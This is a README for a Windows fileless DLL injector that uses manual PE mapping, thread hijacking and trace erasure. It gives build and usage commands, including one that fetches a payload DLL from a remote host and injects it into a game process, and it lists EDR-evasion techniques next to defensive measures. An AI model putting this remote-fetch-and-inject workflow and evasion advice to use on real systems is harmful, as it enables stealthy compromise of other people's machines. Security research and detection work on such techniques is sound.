# Fileless Reflective DLL Loader with Thread Hijacking

## ⚠️ DISCLAIMER - EDUCATIONAL PURPOSE ONLY

**THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY.**

This tool demonstrates advanced Windows internals concepts including:
- Manual PE (Portable Executable) mapping
- Import Address Table (IAT) resolution
- Thread execution hijacking
- Memory manipulation techniques

**WARNING:** 
- **DO NOT use this tool for malicious purposes**
- **DO NOT use on systems you don't own or don't have explicit written permission to test**
- Unauthorized access to computer systems is illegal
- This tool is intended for:
  - Security researchers
  - Penetration testers with proper authorization
  - Malware analysts
  - Red team operations with client consent
  - Educational purposes in controlled environments

## Overview

This project implements a sophisticated DLL injection technique that combines:

1. **Fileless Loading**: Fetches DLL from a remote source or memory buffer without writing to disk
2. **Manual PE Mapping**: Loads the DLL without using Windows' LoadLibrary function
3. **Thread Hijacking**: Injects code by hijacking an existing thread instead of creating a new one
4. **Self-Erasure**: Includes a panic function to restore original state and erase traces

## Architecture

### Components

#### 1. NetworkStream (`NetworkStream.h/.cpp`)
- Handles fetching raw DLL binary from remote sources
- Simulates SSL socket communication
- Can load from local files (for testing) or network sources
- Never writes DLL to disk

#### 2. PEMapper (`PEMapper.h/.cpp`)
- Manually maps PE (DLL) into target process memory
- Validates PE headers (DOS, NT)
- Copies sections to allocated memory
- **Resolves Imports (IAT)**: Manually resolves all imported functions
- **Applies Relocations**: Fixes addresses when DLL isn't loaded at preferred base
- Calculates proper entry point

#### 3. ThreadHijacker (`ThreadHijacker.h/.cpp`)
- Finds target process by name
- Locates a suitable thread in the target process
- **Suspends** the target thread
- **Captures** thread context using `GetThreadContext`
- **Redirects RIP** (Instruction Pointer) to DLL entry point
- Resumes thread with modified context

#### 4. PanicFunction (`PanicFunction.h/.cpp`)
- Emergency cleanup and self-erasure
- Restores original thread context
- Zeros allocated memory using `SecureZeroMemory`
- Frees remote memory allocations
- Clears operation traces

#### 5. Main Program (`main.cpp`)
- Command-line interface
- Orchestrates the injection process
- Provides interactive panic function trigger

## Technical Details

### Manual PE Mapping Process

1. **Validation**: Verify DOS and NT headers
2. **Memory Allocation**: Allocate memory in target process with `VirtualAllocEx`
3. **Header Copy**: Copy PE headers to allocated memory
4. **Section Mapping**: Copy each section to its virtual address
5. **Import Resolution**: 
   - Parse Import Directory Table
   - For each imported DLL:
     - Load the DLL in injector process
     - Resolve each imported function address
     - Write resolved addresses to Import Address Table (IAT)
6. **Relocation**: 
   - Calculate base address delta
   - Parse Base Relocation Table
   - Apply fixups to all absolute addresses
7. **Entry Point**: Calculate entry point address

### Thread Hijacking Technique

Instead of using `CreateRemoteThread` (easily detected), this technique:

1. Finds an existing thread in the target process
2. Suspends the thread using `SuspendThread`
3. Captures the current thread context with `GetThreadContext`
4. Saves original RIP (x64) or EIP (x86) for restoration
5. Modifies RIP to point to injected DLL entry point
6. Sets new context with `SetThreadContext`
7. Resumes thread with `ResumeThread`

The thread now executes the injected code!

### Self-Erasure Mechanism

The panic function:
1. Suspends hijacked thread
2. Restores original thread context (RIP/EIP)
3. Zeros the entire allocated memory region with `SecureZeroMemory`
4. Frees the allocated memory with `VirtualFreeEx`
5. Resumes thread to continue normal execution
6. Clears any local traces

## Building

### Prerequisites
- Windows 10/11
- CMake 3.15 or higher
- Visual Studio 2019 or higher (MSVC) or MinGW-w64
- C++17 compatible compiler

### Build Instructions

```bash
# Create build directory
mkdir build
cd build

# Configure
cmake ..

# Build
cmake --build . --config Release

# Output files:
# - FilelessDLLLoader.exe (main injector)
# - ExamplePayload.dll (test payload)
```

### Manual Build (Visual Studio)

```bash
cl /EHsc /std:c++17 /I include src/*.cpp /Fe:FilelessDLLLoader.exe ws2_32.lib
cl /LD /EHsc examples/ExamplePayload.cpp /Fe:ExamplePayload.dll
```

## Usage

### Basic Syntax

```bash
FilelessDLLLoader.exe <mode> [options]
```

### Modes

#### Local Mode (Testing)
Load DLL from local file:
```bash
FilelessDLLLoader.exe local <dll_path> <target_process>
```

Example:
```bash
FilelessDLLLoader.exe local ExamplePayload.dll notepad.exe
```

#### Network Mode
Fetch DLL from remote server:
```bash
FilelessDLLLoader.exe network <host> <port> <resource> <target_process>
```

Example:
```bash
FilelessDLLLoader.exe network 192.168.1.100 8080 /payload.dll FiveM.exe
```

### Interactive Controls

Once injection is successful:
- Press **P** to activate PANIC function (self-erase and restore)
- Press **Q** to quit without panic

## Testing

### Safe Testing Environment

1. **Use a VM**: Always test in a virtual machine
2. **Test Target**: Use benign processes like `notepad.exe` or `calc.exe`
3. **Example Payload**: Use the provided `ExamplePayload.dll` which only displays a message box

### Testing Steps

1. Start notepad:
   ```bash
   notepad.exe
   ```

2. Build the example payload:
   ```bash
   cmake --build build --config Release
   ```

3. Run the injector:
   ```bash
   build\Release\FilelessDLLLoader.exe local build\Release\ExamplePayload.dll notepad.exe
   ```

4. Observe:
   - Console output showing injection steps
   - Message box from injected DLL
   - Press 'P' to test panic function

## Security Considerations

### Detection

This technique may be detected by:
- **EDR/AV**: Memory scanning, behavioral analysis
- **Process Monitoring**: Thread context changes, memory allocations
- **Memory Forensics**: Suspicious memory regions
- **ETW**: Event Tracing for Windows

### Evasion (Educational)

Techniques to improve stealth (for educational understanding):
- Encrypt DLL in transit and memory
- Use indirect syscalls instead of Windows APIs
- Implement anti-debugging checks
- Randomize timing and behavior
- Module stomping instead of new allocations

### Defensive Measures

To defend against this technique:
- Enable tamper protection in Windows Defender
- Deploy EDR solutions with thread context monitoring
- Use application whitelisting
- Enable memory protection features (CFG, DEP)
- Monitor for suspicious thread operations
- Implement least privilege access

## Legal and Ethical Guidelines

### ✅ Authorized Use Cases
- Security research in controlled environments
- Penetration testing with written authorization
- Malware analysis and reverse engineering
- Red team exercises with client consent
- Educational demonstrations in academic settings

### ❌ Prohibited Use Cases
- Any unauthorized access to computer systems
- Deploying on systems without owner's explicit permission
- Circumventing security measures without authorization
- Any illegal activity

### Responsibility

By using this tool, you agree to:
1. Use only on systems you own or have explicit written permission to test
2. Take full responsibility for your actions
3. Comply with all applicable laws and regulations
4. Use for legitimate security research and education only

## Technical References

### Windows API Documentation
- [Process and Thread Functions](https://docs.microsoft.com/en-us/windows/win32/procthread/process-and-thread-functions)
- [PE Format](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)
- [Memory Management](https://docs.microsoft.com/en-us/windows/win32/memory/memory-management-functions)

### Academic Papers
- "Windows Internals" by Mark Russinovich
- "The Rootkit Arsenal" by Bill Blunden
- "Practical Malware Analysis" by Michael Sikorski

## Future Enhancements

Potential improvements for educational purposes:
- [ ] Support for x86 (32-bit) processes
- [ ] Implement indirect syscalls
- [ ] Add encryption for in-memory DLL
- [ ] Support for position-independent code
- [ ] Enhanced anti-debugging techniques
- [ ] Module stomping implementation
- [ ] Heaven's Gate for WoW64 injection

## Troubleshooting

### Common Issues

**"Failed to open process"**
- Run as Administrator
- Ensure target process is running
- Check if target process architecture matches (x64/x86)

**"Failed to resolve imports"**
- Some DLLs may not be present on target system
- Ensure payload DLL only uses common Windows DLLs

**"Access Denied"**
- Target process may be protected
- Try a different target process
- Some system processes are protected

## Contributing

This is an educational project. Contributions should:
- Enhance educational value
- Improve code quality and documentation
- Add safety features
- Never facilitate malicious use

## License

This project is provided for educational purposes only. See LICENSE file for details.

## Authors

Created for educational and security research purposes.

## Acknowledgments

- Windows Internals community
- Security researchers who responsibly share knowledge
- Open source security tools community

---

**Remember: With great power comes great responsibility. Use this knowledge ethically and legally.**
